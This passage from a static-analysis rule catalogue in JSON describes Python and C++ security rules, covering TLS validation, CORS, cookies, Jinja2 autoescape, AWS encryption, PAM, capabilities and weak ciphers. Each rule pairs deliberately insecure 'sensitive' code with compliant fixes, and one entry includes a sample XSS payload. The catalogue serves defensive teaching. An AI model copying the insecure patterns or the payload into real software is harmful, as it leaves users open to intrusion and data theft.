ssl._create_default_https_context()\n</pre>\n<h3>How does this work?</h3>\n<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>\n<p>To avoid running into problems with invalid certificates, consider the following sections.</p>\n<h4>Using trusted certificates</h4>\n<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list\nof trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no\nadditional code or configuration.</p>\n<h4>Working with self-signed certificates or non-standard CAs</h4>\n<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted\nroots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/295\">CWE-295 - Improper Certificate Validation</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S6333": {
        "name": "Creating public APIs is security-sensitive",
        "htmlDesc": "<p>Creating APIs without authentication unnecessarily increases the attack surface on the target infrastructure.</p>\n<p>Unless another authentication method is used, attackers have the opportunity to attempt attacks against the underlying API.<br> This means attacks\nboth on the functionality provided by the API and its infrastructure.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The underlying API exposes all of its contents to any anonymous Internet user. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>In general, prefer limiting API access to a specific set of people or entities.</p>\n<p>AWS provides multiple methods to do so:</p>\n<ul>\n  <li> <code>AWS_IAM</code>, to use standard AWS IAM roles and policies. </li>\n  <li> <code>COGNITO_USER_POOLS</code>, to use customizable OpenID Connect (OIDC) identity providers (IdP). </li>\n  <li> <code>CUSTOM</code>, to use an AWS-independant OIDC provider, glued to the infrastructure with a Lambda authorizer. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_apigateway/Resource.html\">aws_cdk.aws_apigateway.Resource</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_apigateway as apigateway\n)\n\nresource = api.root.add_resource(\"example\")\nresource.add_method(\n    \"GET\",\n    authorization_type=apigateway.AuthorizationType.NONE  # Sensitive\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigatewayv2.CfnRoute.html\">aws_cdk.aws_apigatewayv2.CfnRoute</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_apigatewayv2 as apigateway\n)\n\napigateway.CfnRoute(\n    self,\n    \"no-auth\",\n    api_id=api.ref,\n    route_key=\"GET /test\",\n    authorization_type=\"NONE\"  # Sensitive\n)\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_apigateway/Resource.html\">aws_cdk.aws_apigateway.Resource</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_apigateway as apigateway\n)\n\nopts = apigateway.MethodOptions(\n    authorization_type=apigateway.AuthorizationType.IAM\n)\nresource = api.root.add_resource(\n    \"example\",\n    default_method_options=opts\n)\nresource.add_method(\n    \"POST\",\n    authorization_type=apigateway.AuthorizationType.IAM\n)\nresource.add_method(  # authorization_type is inherited from the Resource's configured default_method_options\n    \"POST\"\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigatewayv2.CfnRoute.html\">aws_cdk.aws_apigatewayv2.CfnRoute</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_apigatewayv2 as apigateway\n)\n\napigateway.CfnRoute(\n    self,\n    \"auth\",\n    api_id=api.ref,\n    route_key=\"GET /test\",\n    authorization_type=\"AWS_IAM\"\n)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-control-access-to-api.html\">AWS Documentation</a> -\n  Controlling and managing access to a REST API in API Gateway </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "python:S5247": {
        "name": "Disabling auto-escaping in template engines is security-sensitive",
        "htmlDesc": "<p>To reduce the risk of cross-site scripting attacks, templating systems, such as <code>Twig</code>, <code>Django</code>, <code>Smarty</code>,\n<code>Groovy's template engine</code>, allow configuration of automatic variable escaping before rendering templates. When escape occurs, characters\nthat make sense to the browser (eg: &lt;a&gt;) will be transformed/replaced with escaped/sanitized values (eg: &amp; lt;a&amp; gt; ).</p>\n<p>Auto-escaping is not a magic feature to annihilate all cross-site scripting attacks, it depends on <a\nhref=\"https://twig.symfony.com/doc/3.x/filters/escape.html\">the strategy applied</a> and the context, for example a \"html auto-escaping\" strategy\n(which only transforms html characters into <a href=\"https://developer.mozilla.org/en-US/docs/Glossary/Entity\">html entities</a>) will not be relevant\nwhen variables are used in a <a href=\"https://en.wikipedia.org/wiki/HTML_attribute\">html attribute</a> because '<code>:</code>' character is not\nescaped and thus an attack as below is possible:</p>\n<pre>\n&lt;a href=\"{{ myLink }}\"&gt;link&lt;/a&gt; // myLink = javascript:alert(document.cookie)\n&lt;a href=\"javascript:alert(document.cookie)\"&gt;link&lt;/a&gt; // JS injection (XSS attack)\n</pre>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Templates are used to render web content and\n    <ul>\n      <li> dynamic variables in templates come from untrusted locations or are user-controlled inputs </li>\n      <li> there is no local mechanism in place to sanitize or validate the inputs. </li>\n    </ul>  </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Enable auto-escaping by default and continue to review the use of inputs in order to be sure that the chosen auto-escaping strategy is the right\none.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nfrom jinja2 import Environment\n\nenv = Environment() # Sensitive: New Jinja2 Environment has autoescape set to false\nenv = Environment(autoescape=False) # Sensitive:\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nfrom jinja2 import Environment\nenv = Environment(autoescape=True) # Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> <a href=\"https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md\">OWASP Cheat\n  Sheet</a> - XSS Prevention Cheat Sheet </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "python:S6330": {
        "name": "Using unencrypted SQS queues is security-sensitive",
        "htmlDesc": "<p>Amazon Simple Queue Service (SQS) is a managed message queuing service for application-to-application (A2A) communication. Amazon SQS can store\nmessages encrypted as soon as they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message\nfrom the file system, for example through a vulnerability in the service, they are not able to access the data.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The queue contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt SQS queues that contain sensitive information. Encryption and decryption are handled transparently by SQS, so no\nfurther modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.Queue.html\">aws_cdk.aws_sqs.Queue</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_sqs as sqs\n)\n\nclass QueueStack(Stack):\n    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:\n        super().__init__(scope, construct_id, **kwargs)\n        sqs.Queue( # Sensitive, unencrypted by default\n            self,\n            \"example\"\n        )\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.CfnQueue.html\">aws_cdk.aws_sqs.CfnQueue</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_sqs as sqs\n)\n\nclass CfnQueueStack(Stack):\n    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:\n        super().__init__(scope, construct_id, **kwargs)\n        sqs.CfnQueue( # Sensitive, unencrypted by default\n            self,\n            \"example\"\n        )\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.Queue.html\">aws_cdk.aws_sqs.Queue</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_sqs as sqs\n)\n\nclass QueueStack(Stack):\n    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:\n        super().__init__(scope, construct_id, **kwargs)\n        sqs.Queue(\n            self,\n            \"example\",\n            encryption=sqs.QueueEncryption.KMS_MANAGED\n        )\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.CfnQueue.html\">aws_cdk.aws_sqs.CfnQueue</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_sqs as sqs\n)\n\nclass CfnQueueStack(Stack):\n    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:\n        super().__init__(scope, construct_id, **kwargs)\n        my_key = kms.Key(self, \"key\")\n        sqs.CfnQueue(\n            self,\n            \"example\",\n            kms_master_key_id=my_key.key_id\n        )\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-server-side-encryption.html\">AWS Documentation</a> -\n  Encryption at rest </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "python:S6332": {
        "name": "Using unencrypted EFS file systems is security-sensitive",
        "htmlDesc": "<p>Amazon Elastic File System (EFS) is a serverless file system that does not require provisioning or managing storage. Stored files can be\nautomatically encrypted by the service. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are\nnot able to access the data.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The file system contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt EFS file systems that contain sensitive information. Encryption and decryption are handled transparently by EFS, so no\nfurther modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.FileSystem.html\">aws_cdk.aws_efs.FileSystem</a> and <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.CfnFileSystem.html\">aws_cdk.aws_efs.CfnFileSystem</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_efs as efs\n)\n\nefs.FileSystem(\n    self,\n    \"example\",\n    encrypted=False  # Sensitive\n)\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.FileSystem.html\">aws_cdk.aws_efs.FileSystem</a> and <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.CfnFileSystem.html\">aws_cdk.aws_efs.CfnFileSystem</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_efs as efs\n)\n\nefs.FileSystem(\n    self,\n    \"example\",\n    encrypted=True\n)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/efs/latest/ug/encryption.html\">AWS Documentation</a> - Data encryption in Amazon EFS </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "python:S2092": {
        "name": "Creating cookies without the \"secure\" flag is security-sensitive",
        "htmlDesc": "<p>When a cookie is protected with the <code>secure</code> attribute set to <em>true</em> it will not be send by the browser over an unencrypted HTTP\nrequest and thus cannot be observed by an unauthorized person during a man-in-the-middle attack.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the cookie is for instance a <em>session-cookie</em> not designed to be sent over non-HTTPS communication. </li>\n  <li> it’s not sure that the website contains <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content\">mixed content</a> or not\n  (ie HTTPS everywhere or not) </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> It is recommended to use <code>HTTPs</code> everywhere so setting the <code>secure</code> flag to <em>true</em> should be the default behaviour\n  when creating cookies. </li>\n  <li> Set the <code>secure</code> flag to <em>true</em> for session-cookies. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>Flask</p>\n<pre>\nfrom flask import Response\n\n@app.route('/')\ndef index():\n    response = Response()\n    response.set_cookie('key', 'value') # Sensitive\n    return response\n</pre>\n<h2>Compliant Solution</h2>\n<p>Flask</p>\n<pre>\nfrom flask import Response\n\n@app.route('/')\ndef index():\n    response = Response()\n    response.set_cookie('key', 'value', secure=True) # Compliant\n    return response\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/315\">CWE-315 - Cleartext Storage of Sensitive Information in a Cookie</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/614\">CWE-614 - Sensitive Cookie in HTTPS Session Without 'Secure' Attribute</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "python:S5122": {
        "name": "Having a permissive Cross-Origin Resource Sharing policy is security-sensitive",
        "htmlDesc": "<p>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0269\">CVE-2018-0269</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14460\">CVE-2017-14460</a> </li>\n</ul>\n<p><a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy\">Same origin policy</a> in browsers prevents, by default and for\nsecurity-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port)\nfrom its own. The requested target can append additional HTTP headers in response, called <a\nhref=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS\">CORS</a>, that act like directives for the browser and change the access control policy\n/ relax the same origin policy.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> You don’t trust the origin specified, example: <code>Access-Control-Allow-Origin: untrustedwebsite.com</code>. </li>\n  <li> Access control policy is entirely disabled: <code>Access-Control-Allow-Origin: *</code> </li>\n  <li> Your access control policy is dynamically defined by a user-controlled input like <a\n  href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin\"><code>origin</code></a> header. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> The <code>Access-Control-Allow-Origin</code> header should be set only for a trusted origin and for specific resources. </li>\n  <li> Allow only selected, trusted domains in the <code>Access-Control-Allow-Origin</code> header. Prefer whitelisting domains over blacklisting or\n  allowing any domain (do not use * wildcard nor blindly return the <code>Origin</code> header content without any checks). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>Django:</p>\n<pre>\nCORS_ORIGIN_ALLOW_ALL = True # Sensitive\n</pre>\n<p>Flask:</p>\n<pre>\nfrom flask import Flask\nfrom flask_cors import CORS\n\napp = Flask(__name__)\nCORS(app, resources={r\"/*\": {\"origins\": \"*\", \"send_wildcard\": \"True\"}}) # Sensitive\n</pre>\n<p>User-controlled origin:</p>\n<pre>\norigin = request.headers['ORIGIN']\nresp = Response()\nresp.headers['Access-Control-Allow-Origin'] = origin # Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Django:</p>\n<pre>\nCORS_ORIGIN_ALLOW_ALL = False # Compliant\n</pre>\n<p>Flask:</p>\n<pre>\nfrom flask import Flask\nfrom flask_cors import CORS\n\napp = Flask(__name__)\nCORS(app, resources={r\"/*\": {\"origins\": \"*\", \"send_wildcard\": \"False\"}}) # Compliant\n</pre>\n<p>User-controlled origin validated with an allow-list:</p>\n<pre>\norigin = request.headers['ORIGIN']\nresp = Response()\nif origin in TRUSTED_ORIGINS:\n   resp.headers['Access-Control-Allow-Origin'] = origin\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS\">developer.mozilla.org</a> - CORS </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy\">developer.mozilla.org</a> - Same origin policy </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing\">OWASP HTML5 Security\n  Cheat Sheet</a> - Cross Origin Resource Sharing </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/346\">CWE-346 - Origin Validation Error</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/942\">CWE-942 - Overly Permissive Cross-domain Whitelist</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "cpp:S5982": {
        "name": "Changing working directories without verifying the success is security-sensitive",
        "htmlDesc": "<p>The purpose of changing the current working directory is to modify the base path when the process performs relative path resolutions. When the\nworking directory cannot be changed, the process keeps the directory previously defined as the active working directory. Thus, verifying the success\nof chdir() type of functions is important to prevent unintended relative paths and unauthorized access.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The success of changing the working directory is relevant for the application. </li>\n  <li> Changing the working directory is required by chroot to make the new root effective. </li>\n  <li> Subsequent disk operations are using relative paths. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>After changing the current working directory verify the success of the operation and handle errors.</p>\n<h2>Sensitive Code Example</h2>\n<p>The <code>chdir</code> operation could fail and the process still has access to unauthorized resources. The return code should be verified:</p>\n<pre>\nconst char* any_dir = \"/any/\";\nchdir(any_dir); // Sensitive: missing check of the return value\n\nint fd = open(any_dir, O_RDONLY | O_DIRECTORY);\nfchdir(fd); // Sensitive: missing check of the return value\n</pre>\n<h2>Compliant Solution</h2>\n<p>Verify the return code of <code>chdir</code> and handle errors:</p>\n<pre>\nconst char* root_dir = \"/jail/\";\nif (chdir(root_dir) == -1) {\n  exit(-1);\n} // Compliant\n\nint fd = open(any_dir, O_RDONLY | O_DIRECTORY);\nif(fchdir(fd) == -1) {\n  exit(-1);\n} // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/252\">CWE-252 - Unchecked Return Value</a> </li>\n  <li> <a href=\"https://man7.org/linux/man-pages/man2/chdir.2.html\">man7.org</a> - chdir </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "cpp:S5832": {
        "name": "Account validity should be verified when authenticating users with PAM",
        "htmlDesc": "<p>Pluggable authentication module (PAM) is a mechanism used on many UNIX variants to provide a unified way to authenticate users, independently of\nthe underlying authentication scheme.</p>\n<h2>Why is this an issue?</h2>\n<p>When authenticating users, if the validity of the account is not checked (not locked, not expired …​), it may lead to unauthorized access to\nresources.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nint valid(pam_handle_t *pamh) {\n    if (pam_authenticate(pamh, PAM_DISALLOW_NULL_AUTHTOK) != PAM_SUCCESS) { // Noncompliant\n        return -1;\n    }\n\n    return 0;\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nint valid(pam_handle_t *pamh) {\n    if (pam_authenticate(pamh, PAM_DISALLOW_NULL_AUTHTOK) != PAM_SUCCESS) {\n        return -1;\n    }\n    if (pam_acct_mgmt(pamh, 0) != PAM_SUCCESS) {\n        return -1;\n    }\n\n    return 0;\n}\n</pre>\n<h3>How does this work?</h3>\n<p>The account validity is checked with <code>pam_acct_mgmt</code> when authenticating a user with <code>pam_authenticate</code>.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> The Open Group - <a href=\"https://pubs.opengroup.org/onlinepubs/8329799/pam_acct_mgmt.htm\"><code>pam_acct_mgmt</code></a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Packt hub - <a href=\"https://hub.packtpub.com/development-pluggable-authentication-modules-pam/\">Development with Pluggable Authentication\n  Modules (PAM)</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/304\">CWE-304 - Missing Critical Step in Authentication</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "cpp:S5849": {
        "name": "Setting capabilities is security-sensitive",
        "htmlDesc": "<p>Setting capabilities can lead to privilege escalation.</p>\n<p>Linux capabilities allow you to assign narrow slices of <code>root</code>'s permissions to files or processes. A thread with capabilities bypasses\nthe normal kernel security checks to execute high-privilege actions such as mounting a device to a directory, without requiring (additional) root\nprivileges.</p>\n<h2>Ask Yourself Whether</h2>\n<p>Capabilities are granted:</p>\n<ul>\n  <li> To a process that does not require all capabilities to do its job. </li>\n  <li> To a not trusted process. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Capabilities are high privileges, traditionally associated with superuser (root), thus make sure that the most restrictive and necessary\ncapabilities are assigned to files and processes.</p>\n<h2>Sensitive Code Example</h2>\n<p>When setting capabilities:</p>\n<pre>\ncap_t caps = cap_init();\ncap_value_t cap_list[2];\ncap_list[0] = CAP_FOWNER;\ncap_list[1] = CAP_CHOWN;\ncap_set_flag(caps, CAP_PERMITTED, 2, cap_list, CAP_SET);\n\ncap_set_file(\"file\", caps); // Sensitive\ncap_set_fd(fd, caps); // Sensitive\ncap_set_proc(caps); // Sensitive\ncapsetp(pid, caps); // Sensitive\ncapset(hdrp, datap); // Sensitive: is discouraged to be used because it is a system call\n</pre>\n<p>When setting SUID/SGID attributes:</p>\n<pre>\nchmod(\"file\", S_ISUID|S_ISGID); // Sensitive\nfchmod(fd, S_ISUID|S_ISGID); // Sensitive\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/250\">CWE-250 - Execution with Unnecessary Privileges</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/266\">CWE-266 - Incorrect Privilege Assignment</a> </li>\n  <li> <a href=\"https://forums.grsecurity.net/viewtopic.php?f=7&amp;t=2522\">False Boundaries and Arbitrary Code Execution</a> </li>\n  <li> <a href=\"https://man7.org/linux/man-pages/man7/capabilities.7.html\">Linux manual page</a> - capabilities(7) </li>\n</ul>",
        "severity": "MAJOR"
      },
      "cpp:S5547": {
        "name": "Cipher algorithms should be robust",
        "htmlDesc": "<p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for\nseveral important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in Botan</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n#include &lt;botan/cipher_mode.h&gt;\n\nvoid encrypt() {\n  Botan::Cipher_Mode::create(\"DES/CBC/PKCS7\", Botan::ENCRYPTION); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n#include &lt;botan/cipher_mode.h&gt;\n\nvoid encrypt() {\n  Botan::Cipher_Mode::create(\"AES-256/GCM\", Botan::ENCRYPTION);\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use a secure algorithm</h4>\n<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an\nalgorithm is the Advanced Encryption Standard (AES).</p>\n<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://botan.randombit.net/handbook/\">Botan</a> - Handbook </li>\n  <li> <a href=\"https://www.feistyduck.com/books/openssl-cookbook/\">OpenSSL</a> - Cookbook </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a 